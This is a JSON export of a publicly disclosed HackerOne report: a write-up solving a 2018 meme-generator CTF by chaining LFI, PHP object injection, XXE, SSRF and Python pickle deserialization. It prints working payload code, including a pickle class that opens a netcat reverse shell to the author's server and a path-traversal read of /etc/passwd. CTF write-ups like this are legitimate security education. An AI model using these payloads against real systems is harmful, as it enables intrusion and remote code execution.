@@ -1,0 +1,376 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2018-10-22T16:26:40.109Z", 
+    "voters": [
+        "herrera", 
+        "0xacb", 
+        "eveeez", 
+        "mygf", 
+        "japz", 
+        "spetr0x", 
+        "den1al", 
+        "iheb_hamad", 
+        "sameerphad72", 
+        "jatacheers", 
+        "and 1 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": false, 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 415222, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2018-10-22T16:02:15.755Z", 
+    "vulnerability_information": "## Baby steps\nEarlier today a friend tipped me off about an ongoing CTF challenge that was being run by HackerOne and would get the first ten winners a ticket to participate in #h15411, which will be a live-hacking event happening in Buenos Aires.\n\nThis immediately caught my attention and I decided to take a look to see how far I could get.\n\nThe first step was decoding the QR code that was in the tweet announcing the challenge (https://twitter.com/Hacker0x01/status/1044974142150373378) and then decoding the hexadecimal value obtained, which in turn gave me the URL of the challenge.\n\n## Game on!\n\nAfter accessing https://h1-5411.h1ctf.com, it's possible to notice that this application lets you generate memes from six templates which are divided into two different types. Three of which are of the type image and the other three, of type text. The template hidden input also caught my attention, which was apparently being used to load these templates from different files.\n\nThis was screaming \"PATH TRAVERSAL! LFI!\" which was indeed the first way I tried to tackle the challenge (type = image, template=../../../../../../etc/passwd) and needlessly to say I was rick rolled :\u00b4(\n\nShortly after, I tried to change the type to \"text\" instead of using the type \"image\" and it worked! I now had the ability to read local files from the server, a vulnerability known as LFI, short for Local File Inclusion.\n\nAfter downloading all the files from /var/www/html/ I started to analyze the code by first looking into /api/import_memes_2.0.php (because I noticed that in its code it utilized unserialize, which, in the past, has been the source of many vulnerabilities in all sorts of web applications).\n\nI quickly realized that it was possible to upload a file containing serialized code encoded in base64 through import_memes_2.0.php and that it would be saved in the session. Also, looking into /includes/classes.php, there was a class named ConfigFile that had the magic function __toString() which called $this->parse() and then finally tried to load XML from a string that it got from its constructor. This is perfect for an Object Injection attack, which by leveraging the magic method __toString() will allow me to control the value passed to the constructor of the ConfigFile class and then perform a XML External Entity attack when the parse() method is called.\n\n## Coding time\n\nThe next step was to create a small php program to generate valid serialized code using a placeholder as the payload.\n\n```\n<?php\n\trequire_once(\"../includes/config.php\");\n\n\t$config = new ConfigFile(\"data:text/html,placeholder\");\n\t$payload = serialize([$config]);\n\n\t// a:1:{i:0;O:10:\"ConfigFile\":1:{s:10:\"config_raw\";s:11:\"placeholder\";}}\n\techo $payload;\n?>\n```\nThen, using python, I created another program that takes a URL as the argument and creates a valid file ready to be uploaded to exploit the XXE vulnerability in the application.\n\nAfter all my attempts to get RCE using the XXE vulnerability failed, my next big bet was in a SSRF attack. I finished coding the program below and then it was a matter of time to scan the internal network and find the local server running in the port 1337.\n\n```\nimport base64, sys\n\nurl = sys.argv[1]\n\nxml = \"\"\"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE xxx [ <!ELEMENT xxx ANY >\n<!ENTITY payload SYSTEM \"php://filter/read=convert.base64-encode/resource=\"\"\" + url + \"\"\"\" >]>\n<test>\n    <toptext>&payload;</toptext>\n</test>\"\"\";\n\nxml_length = len(xml);\n\nstart = 'a:1:{i:0;O:10:\"ConfigFile\":1:{s:10:\"config_raw\";s:' + str(xml_length) + ':\"'\nend   = '\";}}'\n\nall = start+xml+end\nencoded = base64.b64encode(all)\n\nf = open(\"payload.memepak\", \"w\")\nf.write(encoded)\n```\n\n## Reading is fundamental\n\nBy reading the documentation API I was able to discover that setting the debug parameter to one would activate the debug mode.\n\nThen, still following the documentation, I made  a request to http://127.0.0.1:1337/status?debug=1 and it returned base64 encoded debug information, that when decoded looked like a pickle object. Shortly after, I made a request to http://127.0.0.1:1337/update-status?debug=1 which said that the status parameter was missing. I sent the request again, but now with the missing status parameter and the response was that it contained an incorrect padding. This got me thinking and then I sent a new request to http://127.0.0.1:1337/update-status?debug=1&status=MSsx (MSsx being 1+1 encoded in base64) and it returned a new debug message about not being able to find MARK.\n\nA quick search in Google and I confirmed my suspicion that this indeed was related to a Pickle Object Serialization vulnerability. Using the template published by mgeeky (https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd), I was able to create a payload that would exploit the vulnerability and force the challenge's server to establish a reverse shell with my server.\n\n```\nimport cPickle\nimport sys\nimport base64\n\nCOMMAND = \"nc -e /bin/sh 111.111.111.11 1337\"\n\nclass PickleRce(object):\n    def __reduce__(self):\n        import os\n        return (os.system,(COMMAND,))\n\nprint base64.b64encode(cPickle.dumps(PickleRce()))\n```\n## Last words\nFinally, after getting a shell, I executed `ls` and  `cat flag.txt` and got the flag:\n**flag{cha1n1ng_bugs_f0r_fun_4nd_pr0f1t?_or_rep0rt_an_LF1}**\n\nThanks for the challenge and for reading! I had a lot of fun solving it.\n\n## Impact\n\nThe attacker could achieve remote code execution which would allow him to get the flag that will get him invited to the #h15411 :)", 
+    "activity_page_count": 1, 
+    "severity": {
+        "metrics": {
+            "confidentiality": "high", 
+            "privileges_required": "none", 
+            "user_interaction": "none", 
+            "attack_vector": "network", 
+            "attack_complexity": "low", 
+            "scope": "unchanged", 
+            "integrity": "high", 
+            "availability": "high"
+        }, 
+        "rating": "critical", 
+        "score": 9.8, 
+        "author_type": "User"
+    }, 
+    "title": "Solution for h15411's CTF challenge", 
+    "is_member_of_team?": null, 
+    "vote_count": 11, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2018-11-21T16:02:15.801Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-27T17:50:30.225Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-27T17:50:30.225Z", 
+            "actor": {
+                "username": "herrera", 
+                "url": "/herrera", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/135/135/99875cd4a1e8f05697bc81d4a6a585fdd8fdf80c_medium.jpg?1523807275"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "email": "keer0k", 
+            "team_handle": "h1-5411-ctf", 
+            "message": null, 
+            "markdown_message": "", 
+            "type": "Activities::ReportCollaboratorInvited", 
+            "id": 3398124, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-27T17:52:38.572Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-27T17:52:38.572Z", 
+            "actor": {
+                "username": "keer0k", 
+                "url": "/keer0k", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/134/008/52801e13af4df31901b6f35626ab4e23fd32dcd6_medium.jpg?1539614385"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "h1-5411-ctf", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportCollaboratorJoined", 
+            "id": 3398135, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-27T17:57:16.780Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-27T18:00:12.917Z", 
+            "actor": {
+                "username": "herrera", 
+                "url": "/herrera", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/135/135/99875cd4a1e8f05697bc81d4a6a585fdd8fdf80c_medium.jpg?1523807275"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "h1-5411-ctf", 
+            "message": "By the way, while I wrote the report in first person, @keer0 (Guilherme Assmann) helped me in several of the steps, so this was a team effort and in case we end up winning, he should get the invitation.", 
+            "markdown_message": "<p>By the way, while I wrote the report in first person, <a href=\"/keer0\">@keer0</a> (Guilherme Assmann) helped me in several of the steps, so this was a team effort and in case we end up winning, he should get the invitation.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3398148, 
+            "genius_execution_id": null
+        }, 
+        {
+            "attachments": [
+                {
+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/156/aba1fed618ea5f11a92cb64667da7382f189bfb7/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6DOF4BH7%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221522Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDAsIeiAo1xTw4kIWniK3AwV1z%2FDNuc2GpLi7AJOEJ0e4NWAql7yl6ReQj30YP2K5FBrc9xv0H8z3PZE4N7C099Z%2FTC7v7C1gzo54Jgi%2FX3cl%2B1K8PJ1QoShLHpAAjRjf5ciIakpyJZtfax9fUrlrfbg93561WLH%2BcAlYZYP%2FDoT4YEiEnKFoc6r1kz0vtgQeOMs4HdHNkjkFGMI77%2BHQkyTCbcJv5zS%2BkPk%2FmeIs5TPwLonNR3KC9vVtG8%2FxH87F2PEClO9BEdrskZjtMWY6P010JBQmt1CorTu4hj%2BXFqvR%2F690HP1hcC8CWJCyppmtZv0XEClGLMVyC6ib3jbvYHrbrPEHfmQP2RQi0FwMeueNkOH5qbyGqwmmxB4agSDiXM3XAl%2BTc87Wf5p1e%2Bc0zjzZ0xQeKM%2F%2B6b6TparaVSEWnYgYleztcjU3fPWHAZNwL16PwqewCVGh0Qp%2BPnUemfdihk3MmFQeIjHmE7sOQgXva7HlIEEEJ1hyrapkEutFP16gxCQzYqmfLGEsK0wbCxHgen0YqfDv81EZR726krPSisHScLMujI0SnwbcN8IyUwIYqnw663l%2FY9Dhpcje1uM19tGvbMUolrmm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9f229ef1cc6fd33cfdae8966fb8cc624f730fe48fb971dd3e9fa3e2a9a139416", 
+                    "type": "image/png", 
+                    "id": 352156, 
+                    "filename": "image.png"
+                }
+            ], 
+            "automated_response": false, 
+            "created_at": "2018-09-28T00:42:26.212Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-28T00:42:26.212Z", 
+            "actor": {
+                "username": "0xacb", 
+                "url": "/0xacb", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/086/176/6b4c526360126ad49e9273323b70d8d27e1e08bc_medium.jpg?1528485899"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "h1-5411-ctf", 
+            "message": "Congratulations on winning our Meme CTF! You are invited to h1-5411 in Buenos Aires on Saturday, September 29, 2018. Please send us your full name and confirm you can attend to receive full details. \n**You must be in Buenos Aires to attend**\n\n{F352156}", 
+            "markdown_message": "<p>Congratulations on winning our Meme CTF! You are invited to h1-5411 in Buenos Aires on Saturday, September 29, 2018. Please send us your full name and confirm you can attend to receive full details. <br>\n<strong>You must be in Buenos Aires to attend</strong></p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"image.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/156/aba1fed618ea5f11a92cb64667da7382f189bfb7/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ6DOF4BH7%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221522Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDAsIeiAo1xTw4kIWniK3AwV1z%2FDNuc2GpLi7AJOEJ0e4NWAql7yl6ReQj30YP2K5FBrc9xv0H8z3PZE4N7C099Z%2FTC7v7C1gzo54Jgi%2FX3cl%2B1K8PJ1QoShLHpAAjRjf5ciIakpyJZtfax9fUrlrfbg93561WLH%2BcAlYZYP%2FDoT4YEiEnKFoc6r1kz0vtgQeOMs4HdHNkjkFGMI77%2BHQkyTCbcJv5zS%2BkPk%2FmeIs5TPwLonNR3KC9vVtG8%2FxH87F2PEClO9BEdrskZjtMWY6P010JBQmt1CorTu4hj%2BXFqvR%2F690HP1hcC8CWJCyppmtZv0XEClGLMVyC6ib3jbvYHrbrPEHfmQP2RQi0FwMeueNkOH5qbyGqwmmxB4agSDiXM3XAl%2BTc87Wf5p1e%2Bc0zjzZ0xQeKM%2F%2B6b6TparaVSEWnYgYleztcjU3fPWHAZNwL16PwqewCVGh0Qp%2BPnUemfdihk3MmFQeIjHmE7sOQgXva7HlIEEEJ1hyrapkEutFP16gxCQzYqmfLGEsK0wbCxHgen0YqfDv81EZR726krPSisHScLMujI0SnwbcN8IyUwIYqnw663l%2FY9Dhpcje1uM19tGvbMUolrmm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=9f229ef1cc6fd33cfdae8966fb8cc624f730fe48fb971dd3e9fa3e2a9a139416\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/156/aba1fed618ea5f11a92cb64667da7382f189bfb7/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ6DOF4BH7%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221522Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDAsIeiAo1xTw4kIWniK3AwV1z%2FDNuc2GpLi7AJOEJ0e4NWAql7yl6ReQj30YP2K5FBrc9xv0H8z3PZE4N7C099Z%2FTC7v7C1gzo54Jgi%2FX3cl%2B1K8PJ1QoShLHpAAjRjf5ciIakpyJZtfax9fUrlrfbg93561WLH%2BcAlYZYP%2FDoT4YEiEnKFoc6r1kz0vtgQeOMs4HdHNkjkFGMI77%2BHQkyTCbcJv5zS%2BkPk%2FmeIs5TPwLonNR3KC9vVtG8%2FxH87F2PEClO9BEdrskZjtMWY6P010JBQmt1CorTu4hj%2BXFqvR%2F690HP1hcC8CWJCyppmtZv0XEClGLMVyC6ib3jbvYHrbrPEHfmQP2RQi0FwMeueNkOH5qbyGqwmmxB4agSDiXM3XAl%2BTc87Wf5p1e%2Bc0zjzZ0xQeKM%2F%2B6b6TparaVSEWnYgYleztcjU3fPWHAZNwL16PwqewCVGh0Qp%2BPnUemfdihk3MmFQeIjHmE7sOQgXva7HlIEEEJ1hyrapkEutFP16gxCQzYqmfLGEsK0wbCxHgen0YqfDv81EZR726krPSisHScLMujI0SnwbcN8IyUwIYqnw663l%2FY9Dhpcje1uM19tGvbMUolrmm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=9f229ef1cc6fd33cfdae8966fb8cc624f730fe48fb971dd3e9fa3e2a9a139416\" class=\"markdown-inline-image\"></a></p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3399671, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-28T00:43:25.492Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-28T00:43:25.492Z", 
+            "actor": {
+                "username": "0xacb", 
+                "url": "/0xacb", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/086/176/6b4c526360126ad49e9273323b70d8d27e1e08bc_medium.jpg?1528485899"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "h1-5411-ctf", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugTriaged", 
+            "id": 3399679, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "herrera", 
+                "url": "/herrera"
+            }, 
+            "created_at": "2018-09-28T14:26:42.054Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-28T14:26:42.054Z", 
+            "actor": {
+                "username": "0xacb", 
+                "url": "/0xacb", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/086/176/6b4c526360126ad49e9273323b70d8d27e1e08bc_medium.jpg?1528485899"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "h1-5411-ctf", 
+            "message": "Since @herrera already provided me his information via Twitter I'll close this report as resolved.\nFull name: Luan Barcelos Herrera\n\n@keer0 we'll let you know later today if both of you can come.\n\n@herrera We'll send more details soon and invites to the H1-5411 event program and slack.\nSee you tomorrow!\n", 
+            "markdown_message": "<p>Since <a href=\"/herrera\">@herrera</a> already provided me his information via Twitter I&#39;ll close this report as resolved.<br>\nFull name: Luan Barcelos Herrera</p>\n\n<p><a href=\"/keer0\">@keer0</a> we&#39;ll let you know later today if both of you can come.</p>\n\n<p><a href=\"/herrera\">@herrera</a> We&#39;ll send more details soon and invites to the H1-5411 event program and slack.<br>\nSee you tomorrow!</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 3401652, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-28T22:54:00.007Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-28T22:54:00.007Z", 
+            "actor": {
+                "username": "tiffany-h1", 
+                "url": "/tiffany-h1", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "h1-5411-ctf", 
+            "message": "We are excited to inform you that we are opening participation in h1-5411 to entire teams and to virtual participants!   Please keep an eye on your email for your invite to the program!\n\nBest of luck and happy hacking!", 
+            "markdown_message": "<p>We are excited to inform you that we are opening participation in h1-5411 to entire teams and to virtual participants!   Please keep an eye on your email for your invite to the program!</p>\n\n<p>Best of luck and happy hacking!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3404478, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-10-22T16:02:15.772Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-10-22T16:02:15.772Z", 
+            "actor": {
+                "username": "nahamsec", 
+                "url": "/nahamsec", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/413/d2674e2e9e932d4a399a03176edca6b400a0c0d3_medium.png?1516918330"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "h1-5411-ctf", 
+            "first_to_agree": true, 
+            "message": "We would like to publicly disclose your submission. Thanks again for participating in the MemeCTF Challenge. ", 
+            "markdown_message": "<p>We would like to publicly disclose your submission. Thanks again for participating in the MemeCTF Challenge. </p>\n", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 3514761, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-10-22T16:26:40.153Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-10-22T16:26:40.153Z", 
+            "actor": {
+                "username": "herrera", 
+                "url": "/herrera", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/135/135/99875cd4a1e8f05697bc81d4a6a585fdd8fdf80c_medium.jpg?1523807275"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "h1-5411-ctf", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 3514865, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-10-22T16:26:40.209Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-10-22T16:26:40.209Z", 
+            "actor": {
+                "username": "herrera", 
+                "url": "/herrera", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/135/135/99875cd4a1e8f05697bc81d4a6a585fdd8fdf80c_medium.jpg?1523807275"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "h1-5411-ctf", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 3514866, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "herrera", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/herrera", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/135/135/d62df4289c6455358ff4d1e904d08a25d22cc968_small.jpg?1523807275"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 70, 
+        "name": "Code Injection"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -1318386.18834246, 
+    "disclosed_at": "2018-10-22T16:26:40.190Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/415222", 
+    "created_at": "2018-09-27T09:27:19.886Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<h2 id=\"baby-steps\">Baby steps</h2>\n\n<p>Earlier today a friend tipped me off about an ongoing CTF challenge that was being run by HackerOne and would get the first ten winners a ticket to participate in #h15411, which will be a live-hacking event happening in Buenos Aires.</p>\n\n<p>This immediately caught my attention and I decided to take a look to see how far I could get.</p>\n\n<p>The first step was decoding the QR code that was in the tweet announcing the challenge (<a title=\"https://twitter.com/Hacker0x01/status/1044974142150373378\" href=\"/redirect?signature=f7b4ad8db570f78e0371556d5974fe0e624b2a65&amp;url=https%3A%2F%2Ftwitter.com%2FHacker0x01%2Fstatus%2F1044974142150373378\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://twitter.com/Hacker0x01/status/1044974142150373378</span><i class=\"icon-external-link\"></i></a>) and then decoding the hexadecimal value obtained, which in turn gave me the URL of the challenge.</p>\n\n<h2 id=\"game-on\">Game on!</h2>\n\n<p>After accessing <a title=\"https://h1-5411.h1ctf.com\" href=\"/redirect?signature=8658c11684c1f71629223ec4fe5392bce1ddcec9&amp;url=https%3A%2F%2Fh1-5411.h1ctf.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://h1-5411.h1ctf.com</span><i class=\"icon-external-link\"></i></a>, it&#39;s possible to notice that this application lets you generate memes from six templates which are divided into two different types. Three of which are of the type image and the other three, of type text. The template hidden input also caught my attention, which was apparently being used to load these templates from different files.</p>\n\n<p>This was screaming &quot;PATH TRAVERSAL! LFI!&quot; which was indeed the first way I tried to tackle the challenge (type = image, template=../../../../../../etc/passwd) and needlessly to say I was rick rolled :\u00b4(</p>\n\n<p>Shortly after, I tried to change the type to &quot;text&quot; instead of using the type &quot;image&quot; and it worked! I now had the ability to read local files from the server, a vulnerability known as LFI, short for Local File Inclusion.</p>\n\n<p>After downloading all the files from /var/www/html/ I started to analyze the code by first looking into /api/import_memes_2.0.php (because I noticed that in its code it utilized unserialize, which, in the past, has been the source of many vulnerabilities in all sorts of web applications).</p>\n\n<p>I quickly realized that it was possible to upload a file containing serialized code encoded in base64 through import_memes_2.0.php and that it would be saved in the session. Also, looking into /includes/classes.php, there was a class named ConfigFile that had the magic function __toString() which called $this-&gt;parse() and then finally tried to load XML from a string that it got from its constructor. This is perfect for an Object Injection attack, which by leveraging the magic method __toString() will allow me to control the value passed to the constructor of the ConfigFile class and then perform a XML External Entity attack when the parse() method is called.</p>\n\n<h2 id=\"coding-time\">Coding time</h2>\n\n<p>The next step was to create a small php program to generate valid serialized code using a placeholder as the payload.</p>\n<pre class=\"highlight plaintext\"><code>&lt;?php\n    require_once(&quot;../includes/config.php&quot;);\n\n    $config = new ConfigFile(&quot;data:text/html,placeholder&quot;);\n    $payload = serialize([$config]);\n\n    // a:1:{i:0;O:10:&quot;ConfigFile&quot;:1:{s:10:&quot;config_raw&quot;;s:11:&quot;placeholder&quot;;}}\n    echo $payload;\n?&gt;\n</code></pre>\n<p>Then, using python, I created another program that takes a URL as the argument and creates a valid file ready to be uploaded to exploit the XXE vulnerability in the application.</p>\n\n<p>After all my attempts to get RCE using the XXE vulnerability failed, my next big bet was in a SSRF attack. I finished coding the program below and then it was a matter of time to scan the internal network and find the local server running in the port 1337.</p>\n<pre class=\"highlight plaintext\"><code>import base64, sys\n\nurl = sys.argv[1]\n\nxml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;\n&lt;!DOCTYPE xxx [ &lt;!ELEMENT xxx ANY &gt;\n&lt;!ENTITY payload SYSTEM &quot;php://filter/read=convert.base64-encode/resource=&quot;&quot;&quot; + url + &quot;&quot;&quot;&quot; &gt;]&gt;\n&lt;test&gt;\n    &lt;toptext&gt;&amp;payload;&lt;/toptext&gt;\n&lt;/test&gt;&quot;&quot;&quot;;\n\nxml_length = len(xml);\n\nstart = &#39;a:1:{i:0;O:10:&quot;ConfigFile&quot;:1:{s:10:&quot;config_raw&quot;;s:&#39; + str(xml_length) + &#39;:&quot;&#39;\nend   = &#39;&quot;;}}&#39;\n\nall = start+xml+end\nencoded = base64.b64encode(all)\n\nf = open(&quot;payload.memepak&quot;, &quot;w&quot;)\nf.write(encoded)\n</code></pre>\n<h2 id=\"reading-is-fundamental\">Reading is fundamental</h2>\n\n<p>By reading the documentation API I was able to discover that setting the debug parameter to one would activate the debug mode.</p>\n\n<p>Then, still following the documentation, I made  a request to <a title=\"http://127.0.0.1:1337/status?debug=1\" href=\"/redirect?signature=cf64512a87d5ab18597aaa6be53a01b520981f3e&amp;url=http%3A%2F%2F127.0.0.1%3A1337%2Fstatus%3Fdebug%3D1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://127.0.0.1:1337/status?debug=1</span><i class=\"icon-external-link\"></i></a> and it returned base64 encoded debug information, that when decoded looked like a pickle object. Shortly after, I made a request to <a title=\"http://127.0.0.1:1337/update-status?debug=1\" href=\"/redirect?signature=3e2cb994cd8b4b5b20c206d1fc134c23ac2b1e82&amp;url=http%3A%2F%2F127.0.0.1%3A1337%2Fupdate-status%3Fdebug%3D1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://127.0.0.1:1337/update-status?debug=1</span><i class=\"icon-external-link\"></i></a> which said that the status parameter was missing. I sent the request again, but now with the missing status parameter and the response was that it contained an incorrect padding. This got me thinking and then I sent a new request to <a title=\"http://127.0.0.1:1337/update-status?debug=1&amp;status=MSsx\" href=\"/redirect?signature=4b4bef9c6d02d8d502f937b5ed5bf0ae70c86ae5&amp;url=http%3A%2F%2F127.0.0.1%3A1337%2Fupdate-status%3Fdebug%3D1%26status%3DMSsx\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://127.0.0.1:1337/update-status?debug=1&amp;status=MSsx</span><i class=\"icon-external-link\"></i></a> (MSsx being 1+1 encoded in base64) and it returned a new debug message about not being able to find MARK.</p>\n\n<p>A quick search in Google and I confirmed my suspicion that this indeed was related to a Pickle Object Serialization vulnerability. Using the template published by mgeeky (<a title=\"https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd\" href=\"/redirect?signature=1cc955d7b4057aed55a1eaf4ee3319495c19cf7e&amp;url=https%3A%2F%2Fgist.github.com%2Fmgeeky%2Fcbc7017986b2ec3e247aab0b01a9edcd\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd</span><i class=\"icon-external-link\"></i></a>), I was able to create a payload that would exploit the vulnerability and force the challenge&#39;s server to establish a reverse shell with my server.</p>\n<pre class=\"highlight plaintext\"><code>import cPickle\nimport sys\nimport base64\n\nCOMMAND = &quot;nc -e /bin/sh 111.111.111.11 1337&quot;\n\nclass PickleRce(object):\n    def __reduce__(self):\n        import os\n        return (os.system,(COMMAND,))\n\nprint base64.b64encode(cPickle.dumps(PickleRce()))\n</code></pre>\n<h2 id=\"last-words\">Last words</h2>\n\n<p>Finally, after getting a shell, I executed <code>ls</code> and  <code>cat flag.txt</code> and got the flag:<br>\n<strong>flag{cha1n1ng_bugs_f0r_fun_4nd_pr0f1t?_or_rep0rt_an_LF1}</strong></p>\n\n<p>Thanks for the challenge and for reading! I had a lot of fun solving it.</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>The attacker could achieve remote code execution which would allow him to get the flag that will get him invited to the #h15411 